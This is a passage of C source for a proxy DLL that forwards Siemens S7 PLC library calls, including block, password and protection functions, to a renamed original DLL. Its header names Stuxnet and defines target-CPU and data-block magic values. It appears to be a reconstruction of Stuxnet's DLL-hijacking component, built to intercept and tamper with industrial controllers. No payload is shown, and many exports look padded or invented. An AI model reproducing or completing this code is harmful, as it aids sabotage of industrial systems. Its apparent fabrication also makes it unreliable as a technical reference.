    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_checksum");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_set_checksum(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_checksum");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_get_type(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_type");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_set_type(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_type");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_get_number(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_number");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_set_number(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_number");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_get_language(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_language");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_set_language(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_language");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_get_date(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_date");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_set_date(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_date");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_get_author(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_author");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_set_author(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_author");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_get_family(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_family");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_set_family(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_family");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_get_version(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_version");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_set_version(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_version");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_get_name(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_name");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_set_name(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_name");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_get_comment(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_comment");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_set_comment(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_comment");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_get_path(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_path");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_set_path(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_path");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_get_data(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_data");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3, a4);
}

DWORD WINAPI s7blk_set_data(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_data");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3, a4);
}

DWORD WINAPI s7blk_get_mc7(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_get_mc7");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7blk_set_mc7(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7blk_set_mc7");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_lock(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_lock");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_unlock(DWORD a1) {
    typedef DWORD (WINAPI *PFN)(DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_unlock");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1);
}

DWORD WINAPI s7ag_lock_status(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_lock_status");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_password(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_password");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_clear_password(DWORD a1) {
    typedef DWORD (WINAPI *PFN)(DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_clear_password");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1);
}

DWORD WINAPI s7ag_get_password_status(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_password_status");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_block_password(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_block_password");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_clear_block_password(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_clear_block_password");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_block_password_status(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_block_password_status");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_set_engineering_mode(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_engineering_mode");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_engineering_mode(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_engineering_mode");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_protection(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_protection");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_protection(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_protection");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_block_protection(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_block_protection");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_get_block_protection(DWORD a1, DWORD a2, DWORD a3) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_block_protection");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2, a3);
}

DWORD WINAPI s7ag_set_operation_mode(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_operation_mode");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_operation_mode(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_operation_mode");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_diagnostic_buffer(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_diagnostic_buffer");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_diagnostic_buffer(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_diagnostic_buffer");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_clear_diagnostic_buffer(DWORD a1) {
    typedef DWORD (WINAPI *PFN)(DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_clear_diagnostic_buffer");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1);
}

DWORD WINAPI s7ag_set_trace_level(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_trace_level");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_trace_level(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_trace_level");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_log_file(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_log_file");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_log_file(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_log_file");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_debug_level(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_debug_level");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_debug_level(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_debug_level");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_debug_file(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_debug_file");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_debug_file(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_debug_file");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_error_file(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_error_file");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_error_file(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_error_file");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_warning_file(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_warning_file");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_warning_file(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_warning_file");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_info_file(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_info_file");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_info_file(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_info_file");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_verbose(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_verbose");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_verbose(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_verbose");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_silent(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_silent");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_silent(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_silent");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_set_quiet(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_set_quiet");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

DWORD WINAPI s7ag_get_quiet(DWORD a1, DWORD a2) {
    typedef DWORD (WINAPI *PFN)(DWORD, DWORD);
    PFN pfn = (PFN)GetProcAddress(g_hOriginalDll, "s7ag_get_quiet");
    if (!pfn) return 0xFFFFFFFF;
    return pfn(a1, a2);
}

Exports:
EXPORTS
    s7_event
    s7ag_bub_cycl_read_create
    s7ag_bub_read_var
    s7ag_bub_write_var
    s7ag_link_in
    s7ag_read_szl
    s7ag_test
    s7blk_delete
    s7blk_findfirst
    s7blk_findnext
    s7blk_read
    s7blk_write
    s7db_close
    s7db_open
    s7ag_bub_read_var_seg
    s7ag_bub_write_var_seg

    s7ag_connect
    s7ag_disconnect
    s7ag_get_state
    s7ag_set_state
    s7ag_set_timeout
    s7ag_get_timeout
    s7ag_get_connection_info
    s7ag_get_cpu_info
    s7ag_write_szl
    s7ag_read_clock
    s7ag_write_clock
    s7ag_led
    s7ag_clear_diag
    s7ag_download
    s7ag_upload
    s7ag_compile
    s7ag_debug
    s7ag_step7
    s7ag_mc7
    s7ag_comp
    s7ag_conv
    s7ag_encrypt
    s7ag_decrypt
    s7ag_sync
    s7ag_async
    s7blk_get_info
    s7blk_set_info
    s7db_create
    s7db_delete
    s7db_get_info
    s7db_set_info
    s7blk_open
    s7blk_close
    s7blk_get_size
    s7blk_set_size
    s7blk_get_checksum
    s7blk_set_checksum
    s7blk_get_type
    s7blk_set_type
    s7blk_get_number
    s7blk_set_number
    s7blk_get_language
    s7blk_set_language
    s7blk_get_date
    s7blk_set_date
    s7blk_get_author
    s7blk_set_author
    s7blk_get_family
    s7blk_set_family
    s7blk_get_version
    s7blk_set_version
    s7blk_get_name
    s7blk_set_name
    s7blk_get_comment
    s7blk_set_comment
    s7blk_get_path
    s7blk_set_path
    s7blk_get_data
    s7blk_set_data
    s7blk_get_mc7
    s7blk_set_mc7
    s7ag_lock
    s7ag_unlock
    s7ag_lock_status
    s7ag_set_password
    s7ag_clear_password
    s7ag_get_password_status
    s7ag_set_block_password
    s7ag_clear_block_password
    s7ag_get_block_password_status
    s7ag_set_engineering_mode
    s7ag_get_engineering_mode
    s7ag_set_protection
    s7ag_get_protection
    s7ag_set_block_protection
    s7ag_get_block_protection
    s7ag_set_operation_mode
    s7ag_get_operation_mode
    s7ag_set_diagnostic_buffer
    s7ag_get_diagnostic_buffer
    s7ag_clear_diagnostic_buffer
    s7ag_set_trace_level
    s7ag_get_trace_level
    s7ag_set_log_file
    s7ag_get_log_file
    s7ag_set_debug_level
    s7ag_get_debug_level
    s7ag_set_debug_file
    s7ag_get_debug_file
    s7ag_set_error_file
    s7ag_get_error_file
    s7ag_set_warning_file
    s7ag_get_warning_file
    s7ag_set_info_file
    s7ag_get_info_file
    s7ag_set_verbose
    s7ag_get_verbose
    s7ag_set_silent
    s7ag_get_silent
    s7ag_set_quiet
    s7ag_get_quiet
END

S7aaapix.dll
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#define S7AAAPIX_ORIGINAL_DLL_NAME      _T("s7aaapix_orig.dll")
#define S7AAAPIX_SELF_DLL_NAME          _T("s7aaapix.dll")
#define S7AAAPIX_MAX_PATH               260
#define S7AAAPIX_BUFFER_SIZE            4096
#define S7AAAPIX_MAX_DB_SIZE            65536

#define S7AAAPIX_MAGIC_DB8061           0x91E55A3D
#define S7AAAPIX_MAGIC_DB8061_2         0x996AB716
#define S7AAAPIX_MAGIC_DB8061_3         0x4A5CB803

#define S7AAAPIX_DB8061_NUMBER          8061
#define S7AAAPIX_TARGET_CPU_417         0x14109A
#define S7AAAPIX_TARGET_CPU_H           0x141342

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400

typedef DWORD (WINAPI *AUTDoVerb)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTOpenObjectSet)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTCloseObjectSet)(DWORD);
typedef DWORD (WINAPI *AUTGetObject)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTPutObject)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTDeleteObject)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTFindFirst)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTFindNext)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetInfo)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetInfo)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetData)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetData)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetVersion)(DWORD, DWORD);
typedef DWORD (WINAPI *AUTInitialize)(DWORD, DWORD);
typedef DWORD (WINAPI *AUTDeinitialize)(DWORD);
typedef DWORD (WINAPI *AUTGetLastError)(DWORD);
typedef DWORD (WINAPI *AUTSetLastError)(DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectSetInfo)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectSetInfo)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectInfo)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectInfo)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectData)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectData)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTDeleteObjectData)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectList)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectSetList)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectType)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectType)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectName)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectName)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectPath)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectPath)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectParent)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectParent)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectChildren)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectAttributes)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectAttributes)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectPermissions)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectPermissions)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectOwner)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectOwner)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectGroup)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectGroup)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectACL)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectACL)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectSID)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectSID)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectGUID)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectGUID)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectCreationTime)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectModificationTime)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectAccessTime)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectSize)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectChecksum)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectChecksum)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectVersion)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectVersion)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectState)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectState)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectStatus)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectStatus)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectError)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectError)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectWarning)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectWarning)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectInfoEx)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectInfoEx)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectDataEx)(DWORD, DWORD, DWORD, DWORD, DWORD, DWORD);
